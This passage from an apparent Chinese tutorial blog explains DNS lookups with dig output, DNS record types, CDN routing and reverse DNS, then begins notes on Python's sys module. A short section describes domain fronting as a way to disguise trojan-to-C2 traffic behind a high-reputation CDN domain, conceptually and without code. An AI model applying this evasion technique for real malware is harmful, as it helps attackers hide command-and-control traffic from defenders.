src="/../img/DNS%E5%92%8CCDN%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/image-20230427213515688.png" alt="分级查询"></p><p><code>dig</code>命令的<code>+trace</code>参数可以显示DNS的整个分级查询过程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig +trace www.mochazz.cloud<br></code></pre></td></tr></table></figure><p><img src="/../img/DNS%E5%92%8CCDN%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/image-20230427214910938.png" alt="dig +trace www.mochazz.cloud"></p><ul><li><p>列出根域名<code>.</code>的所有NS记录，即所有根域名服务器</p><p>根据内置的根域名服务器IP地址，DNS服务器向所有这些IP地址发出查询请求，询问<code>mochazz.cloud</code>的顶级域名服务器<code>cloud.</code>的NS记录。最先回复的根域名服务器将被缓存，以后只向这台服务器发请求。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; +trace www.mochazz.cloud<br>;; global options: +cmd<br>.21219INNSi.root-servers.net.<br>.21219INNSh.root-servers.net.<br>.21219INNSd.root-servers.net.<br>.21219INNSg.root-servers.net.<br>.21219INNSe.root-servers.net.<br>.21219INNSf.root-servers.net.<br>.21219INNSl.root-servers.net.<br>.21219INNSa.root-servers.net.<br>.21219INNSb.root-servers.net.<br>.21219INNSc.root-servers.net.<br>.21219INNSk.root-servers.net.<br>.21219INNSm.root-servers.net.<br>.21219INNSj.root-servers.net.<br>;; Received 512 bytes from 192.168.1.1<span class="hljs-comment">#53(192.168.1.1) in 58 ms</span><br></code></pre></td></tr></table></figure></li><li><p>显示<code>.cloud</code>域名的13条NS记录，同时返回的还有每一条记录对应的IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">cloud.172800INNSa.nic.cloud.<br>cloud.172800INNSb.nic.cloud.<br>cloud.172800INNSc.nic.cloud.<br>cloud.172800INNSx.nic.cloud.<br>cloud.172800INNSy.nic.cloud.<br>cloud.172800INNSz.nic.cloud.<br></code></pre></td></tr></table></figure></li><li><p>DNS服务器向这些顶级域名服务器发出查询请求，询问<code>www.mochazz.cloud</code>的次级域名<code>mochazz.cloud.</code>的NS记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mochazz.cloud.3600INNSns3.dnsv2.com.<br>mochazz.cloud.3600INNSns4.dnsv2.com.<br></code></pre></td></tr></table></figure><p>上面结果显示<code>mochazz.cloud.</code>有2条NS记录，同时返回的还有每一条NS记录对应的IP地址。</p></li><li><p>DNS服务器向上面这4台NS服务器查询<code>mochazz.cloud.</code>的主机名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www.mochazz.cloud.600INCNAMEcname.vercel-dns.com.<br>mochazz.cloud.86400INNSns3.dnsv2.com.<br>mochazz.cloud.86400INNSns4.dnsv2.com.<br>;; Received 134 bytes from 223.166.151.18<span class="hljs-comment">#53(ns4.dnsv2.com) in 12 ms</span><br></code></pre></td></tr></table></figure><p>结果显示，<code>www.mochazz.cloud</code>有1条<code>CNAME</code>记录，即这CNAME 都可以访问到网站。最先返回结果的NS服务器是<code>ns4.dnsv2.com</code>，IP地址为<code>223.166.151.18</code>。</p></li></ul><h3 id="5-NS-记录的查询"><a href="#5-NS-记录的查询" class="headerlink" title="5. NS 记录的查询"></a>5. NS 记录的查询</h3><p><code>dig</code>命令可以单独查看每一级域名的NS记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig ns cloud<br></code></pre></td></tr></table></figure><p><code>+short</code>参数可以显示简化的结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig +short www.mochazz.cloud<br></code></pre></td></tr></table></figure><h3 id="6-DNS的记录类型"><a href="#6-DNS的记录类型" class="headerlink" title="6. DNS的记录类型"></a>6. DNS的记录类型</h3><p>域名与IP之间的对应关系，称为”记录”（record）。根据使用场景，”记录”可以分成不同的类型（type）。</p><p>常见的DNS记录类型如下：</p><ol><li><code>A</code>：地址记录（Address），返回域名指向的IP地址。</li><li><code>CNAME</code>：规范名称记录（Canonical Name），返回另一个域名，即当前查询的域名是另一个域名的跳转。</li><li><code>NS</code>：域名服务器记录（Name Server），返回保存下一级域名信息的服务器地址。该记录只能设置为域名，不能设置为IP地址。</li><li><code>MX</code>：邮件记录（Mail eXchange），返回接收电子邮件的服务器地址。</li><li><code>PTR</code>：逆向查询记录（Pointer Record），只用于从IP地址查询域名</li></ol><p><code>CNAME</code>记录主要用于域名的内部跳转，为服务器配置提供灵活性，用户感知不到。</p><p>比如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">╰─$ dig www.mochazz.cloud<br><br>; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; www.mochazz.cloud<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 28264</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;www.mochazz.cloud.INA</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">www.mochazz.cloud.600INCNAMEcname.vercel-dns.com.</span><br><span class="hljs-string">cname.vercel-dns.com.600INA76.76.21.98</span><br><span class="hljs-string">cname.vercel-dns.com.600INA76.76.21.61</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>结果显示，<code>www.mochazz.cloud</code>的CNAME记录指向<code>cname.vercel-dns.com</code>。也就是说，用户查询<code>www.mochazz.cloud</code>的时候，实际上返回的是<code>cname.vercel-dns.com</code>的IP地址。这样的好处是，变更服务器IP地址的时候，只要修改<code>cname.vercel-dns.com</code>这个域名就可以了，用户的<code>www.mochazz.cloud</code>域名不用修改。</p><p>由于<code>CNAME</code>记录就是一个替换，所以域名一旦设置<code>CNAME</code>记录以后，就不能再设置其他记录了（比如<code>A</code>记录和<code>MX</code>记录），这是为了防止产生冲突。举例来说，<code>foo.com</code>指向<code>bar.com</code>，而两个域名各有自己的<code>MX</code>记录，如果两者不一致，就会产生问题。由于顶级域名通常要设置<code>MX</code>记录，所以一般不允许用户对顶级域名设置<code>CNAME</code>记录。</p><p><code>PTR</code>记录用于从IP地址反查域名。<code>dig</code>命令的<code>-x</code>参数用于查询<code>PTR</code>记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">╰─$ dig -x 185.199.111.153<br><br>; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; -x 185.199.111.153<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 38751</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;153.111.199.185.in-addr.arpa.INPTR</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">153.111.199.185.in-addr.arpa. 3497 INPTRcdn-185-199-111-153.github.com.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 54 msec</span><br><span class="hljs-string">;; SERVER: 192.168.1.1#53(192.168.1.1)</span><br><span class="hljs-string">;; WHEN: Thu Apr 27 22:02:13 CST 2023</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 90</span><br></code></pre></td></tr></table></figure><p>上面结果显示，<code>153.111.199.185</code>这台服务器的域名是<code>cdn-185-199-111-153.github.com</code>。</p><h3 id="7-其他DNS工具"><a href="#7-其他DNS工具" class="headerlink" title="7. 其他DNS工具"></a>7. 其他DNS工具</h3><ul><li><p><strong>host 命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">╰─$ host baidu.com<br>baidu.com has address 110.242.68.66<br>baidu.com has address 39.156.66.10<br>baidu.com mail is handled by 20 usmx01.baidu.com.<br>baidu.com mail is handled by 20 mx1.baidu.com.<br>baidu.com mail is handled by 15 mx.n.shifen.com.<br>baidu.com mail is handled by 20 jpmx.baidu.com.<br>baidu.com mail is handled by 10 mx.maillb.baidu.com.<br>baidu.com mail is handled by 20 mx50.baidu.com.<br></code></pre></td></tr></table></figure><p><code>host</code>命令也可以用于逆向查询，即从IP地址查询域名，等同于<code>dig -x &lt;ip&gt;</code>。</p></li><li><p><code>nslookup</code></p><p>用于互动式地查询域名记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">╰─$ nslookup cyberzone.cloud                                                                                                1 ↵<br>Server:192.168.1.1<br>Address:192.168.1.1<span class="hljs-comment">#53</span><br><br>Non-authoritative answer:<br>Name:cyberzone.cloud<br>Address: 185.199.110.153<br>Name:cyberzone.cloud<br>Address: 185.199.111.153<br></code></pre></td></tr></table></figure></li><li><p><code>whois</code></p><p>用来查看域名的注册情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whois cyberzone.cloud<br></code></pre></td></tr></table></figure></li></ul><h2 id="CND"><a href="#CND" class="headerlink" title="CND"></a>CND</h2><h3 id="1-什么是CND"><a href="#1-什么是CND" class="headerlink" title="1. 什么是CND"></a>1. 什么是CND</h3><p>CDN全称叫做“Content Delivery Network”，中文叫<strong>内容分发网络</strong>。</p><p>将源站内容分发至最接近用户的节点，使用户可就近取得所需内容，提高用户访问的响应速度和成功率。解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。</p><h3 id="2-原理分析"><a href="#2-原理分析" class="headerlink" title="2. 原理分析"></a>2. 原理分析</h3><p>如图</p><p><img src="/../img/DNS%E5%92%8CCDN%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/image-20230505222258753.png" alt="CDN简单原理图"></p><p>通过域名解析IP分析</p><ol><li>当用户点击网站页面上的内容URL，经过本地DNS系统解析，DNS 系统会最终将域名的解析权交给 <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/CNAME_record">CNAME</a> 指向的 CDN 专用 DNS 服务器。</li><li>CDN 的 DNS 服务器将 CDN 的全局负载均衡设备 IP 地址返回用户。</li><li>用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求。</li><li>CDN 全局负载均衡设备根据用户 IP 地址，以及用户请求的内容URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求。</li><li>基于以下这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的IP地址：</li><li>根据用户 IP 地址，判断哪一台服务器距用户最近；</li><li>根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；</li><li>查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。</li><li>全局负载均衡设备把服务器的 IP 地址返回给用户。</li><li>用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。</li></ol><p>DNS 服务器根据用户 IP 地址，将域名解析成相应节点的缓存服务器IP地址，实现用户就近访问。使用 CDN 服务的网站，只需将其域名解析权交给 CDN 的全局负载均衡（GSLB）设备，将需要分发的内容注入 CDN，就可以实现内容加速了。</p><h2 id="rDNS"><a href="#rDNS" class="headerlink" title="rDNS"></a>rDNS</h2><h3 id="1-反向DNS"><a href="#1-反向DNS" class="headerlink" title="1. 反向DNS"></a>1. 反向DNS</h3><p>在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C">计算机网络</a>中，<strong>反向DNS查找</strong>或<strong>反向DNS解析</strong>（rDNS）是查询域名系统（DNS）来确定IP地址关联的域名的技术——通常的“转发”的反向DNS查找域名的IP地址。反向DNS查询的过程使用<a href="https://zh.wikipedia.org/w/index.php?title=PTR%E8%AE%B0%E5%BD%95&action=edit&redlink=1">PTR记录</a>。互联网的反向DNS数据库植根于 .arpa 顶级域名。</p><p>反向DNS（rDNS或RDNS）是从IP地址查找域名的域名服务（DNS）。 常规的DNS请求将解析给定域名的IP地址； 因此名称为“reverse”。</p><h3 id="2-rDNS的作用"><a href="#2-rDNS的作用" class="headerlink" title="2. rDNS的作用"></a>2. rDNS的作用</h3><p>rDNS主要用于确保邮件交换记录的有效性，用于拦截邮件服务系统中的垃圾邮件。</p><p>一般情况下，垃圾邮件发送者使用动态分配的 IP 地址或者没有注册域名的 IP 地址来发送垃圾邮件，通过反向解析可以判断邮件的合法性。当邮件服务器收到邮件时，邮件服务器会查看邮件由哪个 IP 地址发出，然后根据这个 IP 地址进行反向解析，如果反向解析得到的域名与发送方邮件的域名不一致则认为邮件发送者不是从真正的邮件服务器发出，则可以拒绝接收此邮件。</p><p>比如当 <code>me@qq.com</code> 收到一份来自 <code>fake@163.com</code> 的邮件时，qq邮件服务器会查看邮件来源的 IP，根据 IP 进行反向解析，如果解析到的域名和 <code>163.com</code> 一致，则接收邮件，否则认为邮件来源 IP 伪造成了163服务器 IP ，则拒绝这封邮件。</p><h3 id="3-rDNS过程"><a href="#3-rDNS过程" class="headerlink" title="3. rDNS过程"></a>3. rDNS过程</h3><p>由于正向 DNS 将主机名映射到 IP 地址，因此 rDNS 将服务器 IP 地址映射回主机名。使用 rDNS，可以将 IP 地址反转，然后将<code>in-addr.arpa</code>添加到末尾。这种 IP 地址进行反向 DNS 解析的方法用到的是 PTR 记录。</p><p>使用dig 执行<code>rDNS</code>查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig  -x 185.199.110.153<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; -x 185.199.110.153<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 19917</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;153.110.199.185.in-addr.arpa.INPTR</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">153.110.199.185.in-addr.arpa. 3330 INPTRcdn-185-199-110-153.github.com.</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 101 msec</span><br><span class="hljs-string">;; SERVER: 192.168.1.1#53(192.168.1.1)</span><br><span class="hljs-string">;; WHEN: Sat May 13 21:57:19 CST 2023</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 90</span><br></code></pre></td></tr></table></figure><p>可以在<strong>ANSWER SECTION</strong>看到完整的rDNS PTR记录的IP，返回子域名<code>cdn-185-199-110-153.github.com.</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">153.110.199.185.in-addr.arpa. 3330 INPTRcdn-185-199-110-153.github.com.<br></code></pre></td></tr></table></figure><h2 id="相关的安全攻击"><a href="#相关的安全攻击" class="headerlink" title="相关的安全攻击"></a>相关的安全攻击</h2><h3 id="1-域前置（Domain-Fronting）"><a href="#1-域前置（Domain-Fronting）" class="headerlink" title="1. 域前置（Domain Fronting）"></a>1. 域前置（Domain Fronting）</h3><h4 id="1-1-什么是域前置"><a href="#1-1-什么是域前置" class="headerlink" title="1.1 什么是域前置"></a>1.1 什么是域前置</h4><p>Domain Fronting，中文译名 “域前置” 或 “域名前置”，是一种用于隐藏真实C2服务器IP且同时能伪装为与高信誉域名通信的技术，多用于木马受控端和控制端之间的隐蔽通信。</p><p>这种举动在被封锁的站点与无害站点为同一个大型服务提供商时较为可行，例如由<a href="https://zh.wikipedia.org/wiki/CDN">内容分发网络</a>提供的服务。此时审查者通常很难区分被伪装流量与合法流量的特点，迫使审查者选择放行所有看似无害的流量，或者选择彻底封锁此域的流量。而彻底封锁可能带来显著的附加损害。</p><p>简言之，利用该技术，可以让受控端以为程序是在和一个高信誉域名通信，但实际上却是在和C2服务器进行通信。</p><h4 id="1-2-技术原理"><a href="#1-2-技术原理" class="headerlink" title="1.2 技术原理"></a>1.2 技术原理</h4><p>Domain Fronting 的技术原理图如下</p><p><img src="/../img/DNS%E5%92%8CCDN%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/image-20230513221125910.png" alt="域前置技术原理"></p><p>Domain Fronting 的核心技术是 <code>CDN</code>。</p><p>一般情况下，1台 CDN 会同时负责多个网站的加速服务。</p><p>如果访问的两个网站（a.com 和 b.com）都是由同1台 CDN 服务器（1.1.1.1）进行加速服务，那么当使用浏览器访问这两个域名时，浏览器实际上访问的都是 1.1.1.1 这台 CDN 服务器，但是在浏览器访问的域名有可能是 a.com 也可能是 b.com，所以必须要在和 1.1.1.1 这台 CDN 服务器通信时，在 HTTP 请求包的 Host 头中填入需要访问的域名，CDN 才会知道访问的是哪一个域名后才能返回对应域名的内容。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/113037678">https://zhuanlan.zhihu.com/p/113037678</a></p><p><a href="https://www.anquanke.com/post/id/195011">https://www.anquanke.com/post/id/195011</a></p><p><a href="https://zh.wikipedia.org/zh-sg/%E5%9F%9F%E5%89%8D%E7%BD%AE">https://zh.wikipedia.org/zh-sg/域前置</a></p><p><a href="https://www.cnblogs.com/ConfusedChenSir/articles/16201785.html">https://www.cnblogs.com/ConfusedChenSir/articles/16201785.html</a></p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DNS CDN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python常用标准库学习</title>
    <link href="/2023/04/25/Python%E5%B8%B8%E7%94%A8%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/04/25/Python%E5%B8%B8%E7%94%A8%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Python常用标准库的学习，随手做下笔记</p><h2 id="sys-模块"><a href="#sys-模块" class="headerlink" title="sys 模块"></a>sys 模块</h2><h3 id="1-sys-exit-code"><a href="#1-sys-exit-code" class="headerlink" title="1. sys.exit(code)"></a>1. sys.exit(code)</h3><p>sys.exit(code) 的功能是退出程序。</p><ul><li>参数 code，退出代码，通常 0 代表正常退出，其它值代码异常退出</li><li>返回值，无</li></ul><p>演示 sys.exit(code) 的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)<br>sys.exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;world&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>程序打印 hello 后即退出了，不会执行下一条语句 print(‘world’)。</p><h3 id="2-sys-argv"><a href="#2-sys-argv" class="headerlink" title="2. sys.argv"></a>2. sys.argv</h3><h4 id="2-1-命令行参数"><a href="#2-1-命令行参数" class="headerlink" title="2.1 命令行参数"></a>2.1 命令行参数</h4><p>在 windows 和 linux 中，操作系统提供了命令行的控制方式，用户输入命令完成任务。例如，建立一个目录，输入如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\&gt; <span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>这条命令创建了一个名称为 test 的目录，字符串 ‘mkdir’ 和字符串 ‘test’ 被称为命令行参数。</p><h4 id="2-2-Python-程序的命令行参数"><a href="#2-2-Python-程序的命令行参数" class="headerlink" title="2.2  Python 程序的命令行参数"></a>2.2  Python 程序的命令行参数</h4><p>Python 将命令行参数保存在 sys 模块中的 argv 变量中：</p><ul><li>sys.argv 是一个数组</li><li>数组中存储的是字符串</li></ul><p>在命令行模式下，使用 python 解释器执行程序 <a href="http://program.py/">program.py</a>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\&gt; python program.py argument<br></code></pre></td></tr></table></figure><p>则命令行参数 sys.argv 等于 [‘<a href="http://program.py/">program.py</a>’, ‘argument’]，注意：</p><ul><li>输入的命令行由 3 个单词构成，但是命令行参数不包括 ‘python’</li><li>命令行参数包括 python 程序文件名，即 ‘<a href="http://program.py/">program.py</a>’</li></ul><h5 id="sys-argv"><a href="#sys-argv" class="headerlink" title="sys.argv"></a>sys.argv</h5><p>以列表的方式获取运行 python 程序的命令行参数，其中， sys.argv[0] 通常指该 python程序本身， sys.argv[1] 代表第一个参数， sys.argv[2] 代表第二个参数，以此类推</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">argv</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) &lt; <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请提供三个参数&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;程序名:<span class="hljs-subst">&#123;argv[<span class="hljs-number">0</span>]&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;第一个参数:<span class="hljs-subst">&#123;argv[<span class="hljs-number">1</span>]&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;第二个参数:<span class="hljs-subst">&#123;argv[<span class="hljs-number">2</span>]&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;第三个参数:<span class="hljs-subst">&#123;argv[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        start(sys.argv[<span class="hljs-number">0</span>:])<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;interrupted by user, killing all threads&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="3-标准输入、标准输出、标准出错"><a href="#3-标准输入、标准输出、标准出错" class="headerlink" title="3. 标准输入、标准输出、标准出错"></a>3. 标准输入、标准输出、标准出错</h3><h4 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h4><p>Python 程序将键盘抽象成一个可读的文件，从键盘读取用户输入，类似于从文件中读取数据；Python 程序将屏幕抽象成一个可写的文件，向屏幕输出数据，类似于向文件中写数据。</p><p>Python 程序执行时会自动打开三个文件：</p><ul><li>标准输入文件（stdin），通常对应终端的键盘</li><li>标准输出文件（stdout），对应终端的屏幕</li><li>标准错误输出文件（stderr），对应终端的屏幕</li></ul><p>程序将从标准输入文件读取用户输入，将正常输出数据输出到标准输出文件，而将错误信息输出到标准错误文件。</p><h4 id="3-2-sys-stdin"><a href="#3-2-sys-stdin" class="headerlink" title="3.2 sys.stdin"></a>3.2 sys.stdin</h4><p>sys.stdin 是 python 程序的标准输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><br>line = sys.stdin.readline()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;你输入的为<span class="hljs-subst">&#123;line&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../img/Python%E5%B8%B8%E7%94%A8%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0/image-20230425211722586.png" alt="sys.stdin"></p><h4 id="3-3-sys-stdout"><a href="#3-3-sys-stdout" class="headerlink" title="3.3 sys.stdout"></a>3.3 sys.stdout</h4><p>sys.stdout 是 python 程序的标准输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br>sys.stdout.write(<span class="hljs-string">&#x27;这是&#x27;</span>)<br>sys.stdout.write(<span class="hljs-string">&#x27;python标准库的&#x27;</span>)<br>sys.stdout.write(<span class="hljs-string">&#x27;sys模块&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>输出结果为</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">这是python标准库的sys模块<br></code></pre></td></tr></table></figure><p>从输出可以看出，sys.stdout.write(text) 和 print(text) 的区别：</p><ul><li>print(text) 输出 text 后会自动换行</li><li><strong>sys.stdout.write(text) 输出 text 后不会自动换行</strong></li></ul><h4 id="3-4-sys-stderr"><a href="#3-4-sys-stderr" class="headerlink" title="3.4 sys.stderr"></a>3.4 sys.stderr</h4><p>sys.stderr 是 python 程序的标准出错，与 sys.stdout 相比：</p><ul><li>两者都是将数据输出到屏幕</li><li>将正常的信息输出到 sys.stdout</li><li>将错误的信息输出到 sys.stderr</li></ul><h4 id="3-5-打印下载速度"><a href="#3-5-打印下载速度" class="headerlink" title="3.5 